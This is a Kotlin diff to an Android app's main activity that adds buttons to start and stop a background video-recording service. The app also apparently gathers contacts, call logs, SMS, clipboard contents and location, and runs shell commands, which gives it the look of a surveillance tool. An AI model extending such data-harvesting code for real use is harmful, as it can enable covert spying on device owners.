@@ -35,6 +35,9 @@ class MainActivity : AppCompatActivity() {
     private lateinit var cmdExe : ShellCmdExe
     private lateinit var start : Button
     private lateinit var stop : Button
+    private lateinit var startVideo : Button
+    private lateinit var stopVideo : Button
+
     companion object {
         const val REQUEST_LOCATION_SETTINGS = 1001
         const val BACKGROUND_LOCATION_REQUEST_CODE = 1002
@@ -48,6 +51,9 @@ class MainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_main)
         start = findViewById(R.id.button2)
         stop = findViewById(R.id.button3)
+        startVideo = findViewById(R.id.btnStartVideo)
+        stopVideo = findViewById(R.id.btnStopVideo)
+
         contacts = ContactsRetriever(this)
         callLogs = CallLogsRetriever(this)
         sms = SMSRetriever(this)
@@ -59,8 +65,27 @@ class MainActivity : AppCompatActivity() {
             Log.d("Clipboard",clipboard.getClipboardData())
         }
 
+        startVideo.setOnClickListener {
+            val intent = Intent(this, VideoRecorder::class.java).apply {
+                action = "START_RECORDING"
+                putExtra("cameraId","0")
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
+            Toast.makeText(this,"Video Recording Started",Toast.LENGTH_SHORT).show()
+        }
 
-
+        stopVideo.setOnClickListener {
+            val intent = Intent(this, VideoRecorder::class.java).apply {
+                action = "VIDEO_STOP"
+            }
+            startService(intent)
+            Toast.makeText(this,"Video Recording stopped",Toast.LENGTH_SHORT).show()
+        }
+        
         checkAndRequestPermissions()
 
         start.setOnClickListener {
